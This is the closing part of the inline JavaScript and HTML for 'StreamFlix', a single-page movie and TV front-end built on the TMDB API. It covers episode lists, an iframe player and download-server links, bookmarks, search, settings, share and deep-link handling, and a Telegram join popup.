          <button class="btn-icon" onclick="shareItem(${details.id}, '${type}', '${title.replace(/'/g, "\\'")}')" title="Share">
            <i class="fas fa-share"></i>
          </button>
        </div>
        <div class="cast-section">
          <h3 class="cast-title">Cast</h3>
          <div class="cast-list hide-scrollbar">${cast || '<p style="color: var(--text-muted);">No cast information available.</p>'}</div>
        </div>
        ${seasonsHtml}
        ${downloadHtml}
      `;
      
      if (type === 'tv' && details.seasons && details.seasons.length > 0) {
        loadEpisodes();
      }
    }

    async function loadEpisodes() {
      if (!state.currentItem || state.currentType !== 'tv') return;
      
      const seasonSelect = document.getElementById('seasonSelect');
      const episodeList = document.getElementById('episodeList');
      if (!seasonSelect || !episodeList) return;
      
      state.selectedSeason = parseInt(seasonSelect.value);
      episodeList.innerHTML = '<div class="skeleton" style="height: 100px; margin-bottom: 12px;"></div>'.repeat(3);
      
      try {
        const seasonData = await fetchTMDB(`/tv/${state.currentItem.id}/season/${state.selectedSeason}`);
        const episodes = seasonData?.episodes || [];
        
        episodeList.innerHTML = episodes.map((ep, i) => `
          <div class="episode-item ${i === 0 ? 'active' : ''}" 
               onclick="selectEpisode(${ep.episode_number}, this)"
               style="animation-delay: ${i * 0.05}s">
            <img class="episode-thumb" src="${getImageUrl(ep.still_path, 'w300')}" alt="Episode ${ep.episode_number}">
            <div class="episode-info">
              <div class="episode-number">${ep.episode_number}. ${ep.name}</div>
              <div class="episode-name">${ep.runtime ? ep.runtime + ' min' : ''}</div>
              <div class="episode-overview">${ep.overview || 'No description available.'}</div>
            </div>
          </div>
        `).join('') || '<p style="color: var(--text-muted);">No episodes available.</p>';
        
        state.selectedEpisode = 1;
      } catch (error) {
        console.error('Failed to load episodes:', error);
        episodeList.innerHTML = '<p style="color: var(--text-muted);">Failed to load episodes.</p>';
      }
    }

    function selectEpisode(episodeNumber, element) {
      state.selectedEpisode = episodeNumber;
      document.querySelectorAll('.episode-item').forEach(el => el.classList.remove('active'));
      element.classList.add('active');
      showToast(`Selected Episode ${episodeNumber}`, 'info');
    }

    // ==================== PLAYER ====================
    function playItem(id, type) {
      let url;
      if (type === 'tv') {
        url = `${CONFIG.PLAYER_BASE}tv_${id}&s=${state.selectedSeason}&e=${state.selectedEpisode}`;
      } else {
        url = `${CONFIG.PLAYER_BASE}movie_${id}`;
      }
      
      document.getElementById('playerIframe').src = url;
      document.getElementById('playerModal').classList.add('active');
      document.body.classList.add('no-scroll');
    }

    async function playTrailer(id, type) {
      try {
        const data = await fetchTMDB(`/${type}/${id}/videos`);
        const trailer = data?.results?.find(v => v.type === 'Trailer' && v.site === 'YouTube');
        
        if (trailer) {
          const url = `https://www.youtube.com/embed/${trailer.key}?autoplay=1`;
          document.getElementById('playerIframe').src = url;
          document.getElementById('playerModal').classList.add('active');
          document.body.classList.add('no-scroll');
        } else {
          showToast('No trailer available', 'info');
        }
      } catch (error) {
        showToast('Failed to load trailer', 'error');
      }
    }

    function closePlayer() {
      const modal = document.getElementById('playerModal');
      modal.classList.add('closing');
      setTimeout(() => {
        modal.classList.remove('active', 'closing');
        document.getElementById('playerIframe').src = '';
        document.body.classList.remove('no-scroll');
      }, 300);
    }

    // ==================== DOWNLOAD ====================
    function downloadContent(serverIndex) {
  if (!state.currentItem) {
    showToast('No content selected', 'error');
    return;
  }

  const { id, type } = state.currentItem;
  const server = CONFIG.DOWNLOAD_SERVERS[serverIndex] || CONFIG.DOWNLOAD_SERVERS[0];

  let url;

  if (type === 'tv') {
    
    url = `${server.base}/tv/${id}/${state.selectedSeason}/${state.selectedEpisode}`;
  } else {
    
    url = `${server.base}/movie/${id}`;
  }

  const iframe = document.getElementById('playerIframe');
  iframe.src = url;

  document.getElementById('playerModal').classList.add('active');
  document.body.classList.add('no-scroll');

  showToast('Opening download server...', 'info');
}

    // ==================== BOOKMARKS ====================
    function toggleBookmark(id, type, title, posterPath) {
      const index = state.bookmarks.findIndex(b => b.id === id && b.type === type);
      
      if (index > -1) {
        state.bookmarks.splice(index, 1);
        showToast('Removed from My List', 'info');
        document.querySelector('#bookmarkBtn i')?.classList.replace('fa-check', 'fa-plus');
      } else {
        state.bookmarks.push({ id, type, title, poster_path: posterPath });
        showToast('Added to My List', 'success');
        document.querySelector('#bookmarkBtn i')?.classList.replace('fa-plus', 'fa-check');
      }
      
      localStorage.setItem('streamflix_bookmarks', JSON.stringify(state.bookmarks));
      
      if (state.currentPage === 'bookmarks') {
        loadBookmarks();
      }
    }

    function loadBookmarks() {
      const grid = document.getElementById('bookmarksGrid');
      
      if (state.bookmarks.length === 0) {
        grid.innerHTML = `
          <div class="empty-state" style="grid-column: 1 / -1;">
            <i class="fas fa-bookmark"></i>
            <h3>Your list is empty</h3>
            <p>Save movies and TV shows to watch later</p>
          </div>
        `;
        return;
      }
      
      grid.innerHTML = state.bookmarks.map((item, i) => `
        <div class="search-card" onclick="openDetails(${item.id}, '${item.type}')" style="animation-delay: ${i * 0.05}s">
          <img src="${getImageUrl(item.poster_path, 'w300')}" alt="${item.title}">
        </div>
      `).join('');
    }

    // ==================== SEARCH ====================
    async function loadPopularSearches() {
      const grid = document.getElementById('searchGrid');
      grid.innerHTML = Array(12).fill().map(() => '<div class="skeleton search-card"></div>').join('');
      
      try {
        const data = await fetchTMDB('/movie/popular');
        const items = data?.results?.slice(0, 18) || [];
        
        grid.innerHTML = items.map((item, i) => `
          <div class="search-card" onclick="openDetails(${item.id}, 'movie')" style="animation-delay: ${i * 0.03}s">
            <img src="${getImageUrl(item.poster_path, 'w300')}" alt="${item.title}">
          </div>
        `).join('');
      } catch (error) {
        grid.innerHTML = '<div class="empty-state" style="grid-column: 1 / -1;"><i class="fas fa-exclamation-circle"></i><p>Failed to load</p></div>';
      }
    }

    function handleSearchInput(event) {
      const query = event.target.value.trim();
      
      clearTimeout(state.searchTimeout);
      
      if (!query) {
        document.getElementById('searchResultsTitle').textContent = 'Popular Searches';
        loadPopularSearches();
        return;
      }
      
      state.searchTimeout = setTimeout(() => performSearch(query), 500);
    }

    async function performSearch(query) {
      const grid = document.getElementById('searchGrid');
      const title = document.getElementById('searchResultsTitle');
      
      title.textContent = `Results for "${query}"`;
      grid.innerHTML = Array(12).fill().map(() => '<div class="skeleton search-card"></div>').join('');
      
      try {
        const data = await fetchTMDB('/search/multi', { query });
        const results = (data?.results || []).filter(r => r.poster_path && (r.media_type === 'movie' || r.media_type === 'tv'));
        
        if (results.length === 0) {
          grid.innerHTML = '<div class="empty-state" style="grid-column: 1 / -1;"><i class="fas fa-search"></i><h3>No results found</h3><p>Try a different search term</p></div>';
        } else {
          grid.innerHTML = results.map((item, i) => `
            <div class="search-card" onclick="openDetails(${item.id}, '${item.media_type}')" style="animation-delay: ${i * 0.03}s">
              <img src="${getImageUrl(item.poster_path, 'w300')}" alt="${item.title || item.name}">
            </div>
          `).join('');
        }
      } catch (error) {
        grid.innerHTML = '<div class="empty-state" style="grid-column: 1 / -1;"><i class="fas fa-exclamation-circle"></i><p>Search failed</p></div>';
      }
    }

    function clearSearch() {
      document.getElementById('searchInput').value = '';
      document.getElementById('searchResultsTitle').textContent = 'Popular Searches';
      loadPopularSearches();
    }

    // ==================== SETTINGS ====================
    function loadSettings() {
      const content = document.getElementById('settingsContent');
      
      const languageNames = {
        'en-US': 'English',
        'hi-IN': 'Hindi',
        'ta-IN': 'Tamil',
        'te-IN': 'Telugu',
        'ml-IN': 'Malayalam'
      };
      
      content.innerHTML = `
        <div class="settings-section" style="animation-delay: 0.1s">
          <h3 class="settings-section-title">Profile</h3>
          <div class="settings-card">
            <div class="settings-item">
              <div class="settings-item-left">
                <div class="settings-item-icon"><i class="fas fa-user"></i></div>
                <div>
                  <div class="settings-item-label">Display Name</div>
                </div>
              </div>
              <input type="text" class="profile-input" id="profileNameInput" value="${state.profileName}" 
                     onchange="updateProfileName(this.value)" placeholder="Enter name">
            </div>
          </div>
        </div>
        
        <div class="settings-section" style="animation-delay: 0.2s">
          <h3 class="settings-section-title">Appearance</h3>
          <div class="settings-card">
            <div class="settings-item">
              <div class="settings-item-left">
                <div class="settings-item-icon"><i class="fas fa-palette"></i></div>
                <div>
                  <div class="settings-item-label">Theme Color</div>
                </div>
              </div>
              <div class="theme-colors">
                <div class="theme-color red ${state.themeColor === 'red' ? 'active' : ''}" onclick="setThemeColor('red')"></div>
                <div class="theme-color blue ${state.themeColor === 'blue' ? 'active' : ''}" onclick="setThemeColor('blue')"></div>
                <div class="theme-color green ${state.themeColor === 'green' ? 'active' : ''}" onclick="setThemeColor('green')"></div>
                <div class="theme-color purple ${state.themeColor === 'purple' ? 'active' : ''}" onclick="setThemeColor('purple')"></div>
                <div class="theme-color orange ${state.themeColor === 'orange' ? 'active' : ''}" onclick="setThemeColor('orange')"></div>
                <div class="theme-color pink ${state.themeColor === 'pink' ? 'active' : ''}" onclick="setThemeColor('pink')"></div>
              </div>
            </div>
          </div>
        </div>
        
        <div class="settings-section" style="animation-delay: 0.3s">
          <h3 class="settings-section-title">Language</h3>
          <div class="settings-card">
            <div class="settings-item" onclick="showLanguagePopup()" style="cursor: pointer;">
              <div class="settings-item-left">
                <div class="settings-item-icon"><i class="fas fa-globe"></i></div>
                <div>
                  <div class="settings-item-label">Content Language</div>
                  <div class="settings-item-value">${languageNames[state.language] || 'English'}</div>
                </div>
              </div>
              <div class="settings-item-right"><i class="fas fa-chevron-right"></i></div>
            </div>
          </div>
        </div>
        
        <div class="settings-section" style="animation-delay: 0.4s">
          <h3 class="settings-section-title">About</h3>
          <div class="settings-card">
            <div class="settings-item">
              <div class="settings-item-left">
                <div class="settings-item-icon"><i class="fas fa-info-circle"></i></div>
                <div>
                  <div class="settings-item-label">Version</div>
                  <div class="settings-item-value">1.0.0</div>
                </div>
              </div>
            </div>
            <div class="settings-item">
              <div class="settings-item-left">
                <div class="settings-item-icon"><i class="fas fa-database"></i></div>
                <div>
                  <div class="settings-item-label">Powered by</div>
                  <div class="settings-item-value">TMDB API</div>
                </div>
              </div>
            </div>
          </div>
        </div>
      `;
    }

    function updateProfileName(name) {
      state.profileName = name || 'User';
      localStorage.setItem('streamflix_profile', state.profileName);
      document.getElementById('headerAvatar').textContent = state.profileName.charAt(0).toUpperCase();
      showToast('Profile updated!', 'success');
    }

    // ==================== SHARE ====================
    async function shareItem(id, type, title) {
  const base = window.location.origin + window.location.pathname;
  const url = `${base}#/${type}/${id}`;

  if (navigator.share) {
    try {
      await navigator.share({
        title: `${title} - StreamFlix`,
        text: `Check out ${title} on StreamFlix!`,
        url: url
      });
    } catch (error) {
      if (error.name !== 'AbortError') {
        copyToClipboard(url);
      }
    }
  } else {
    copyToClipboard(url);
  }
}

function copyToClipboard(text) {
  navigator.clipboard.writeText(text).then(() => {
    showToast('Link copied to clipboard!', 'success');
  }).catch(() => {
    showToast('Failed to copy link', 'error');
  });
}

    // ==================== HEADER SCROLL ====================
    function handleScroll() {
      const header = document.getElementById('header');
      header.classList.toggle('scrolled', window.scrollY > 50);
    }

    window.addEventListener('scroll', handleScroll, { passive: true });

    // ==================== DEEP LINKING ====================
    
function handleDeepLink() {
  const hash = location.hash; // #/movie/550

  if (!hash || hash === '#/' || hash === '#') {
    navigateTo('home', false);
    return true;
  }

  const parts = hash.replace('#/', '').split('/');
  const type = parts[0];
  const id = parseInt(parts[1], 10);

  if ((type === 'movie' || type === 'tv') && id) {
    openDetails(id, type, false);
    return true;
  }

  if (type === 'search') {
    navigateTo('search', false);
    return true;
  }

  if (type === 'bookmarks') {
    navigateTo('bookmarks', false);
    return true;
  }

  if (type === 'settings') {
    navigateTo('settings', false);
    return true;
  }

  navigateTo('home', false);
  return true;
}
        
        

    // ==================== INITIALIZATION ====================
    async function init() {
      if (state.themeColor && state.themeColor !== 'red') {
        setThemeColor(state.themeColor);
      }
      
      document.getElementById('headerAvatar').textContent = state.profileName.charAt(0).toUpperCase();
      
      
      
if (location.hash) {
  handleDeepLink();
} else {
  await loadHomeContent();
  navigateTo('home', false);
}
      
      setTimeout(showTelegramCard, 3000);
      setTimeout(() => {
        document.getElementById('loadingOverlay').classList.add('hide');
        document.body.classList.remove('no-scroll');
      }, 500);
    }

    document.addEventListener('DOMContentLoaded', init);

    document.addEventListener('keydown', (e) => {
      if (e.key === 'Escape') {
        const player = document.getElementById('playerModal');
        if (player.classList.contains('active')) {
          closePlayer();
        }
      }
    });
    
    // ==================== TELEGRAM POPUP ====================
function showTelegramCard() {
  if (localStorage.getItem('telegram_joined')) return;
  document.getElementById('telegramOverlay').classList.add('active');
}

function closeTelegram() {
  document.getElementById('telegramOverlay').classList.remove('active');
  localStorage.setItem('telegram_joined', 'later');
}

function joinTelegram() {
  localStorage.setItem('telegram_joined', 'yes');
  window.open('https://t.me/YOUR_CHANNEL_USERNAME', '_blank');
  closeTelegram();
}

setTimeout(showTelegramCard, 3000);
  </script>
  <!-- TELEGRAM JOIN POPUP -->
<div class="telegram-overlay" id="telegramOverlay">
  <div class="telegram-card">
    
    <div class="telegram-icon">
      <i class="fab fa-telegram-plane"></i>
    </div>

    <div class="telegram-title">Join Our Telegram</div>

    <div class="telegram-text">
      Get latest movies, series updates & direct links instantly.
    </div>

    <div class="telegram-actions">
      <button class="telegram-btn later" onclick="closeTelegram()">
        <i class="fas fa-clock"></i> Later
      </button>

      <button class="telegram-btn join" onclick="joinTelegram()">
        <i class="fab fa-telegram-plane"></i> Join
      </button>
    </div>

  </div>
</div>
</body>
</html>
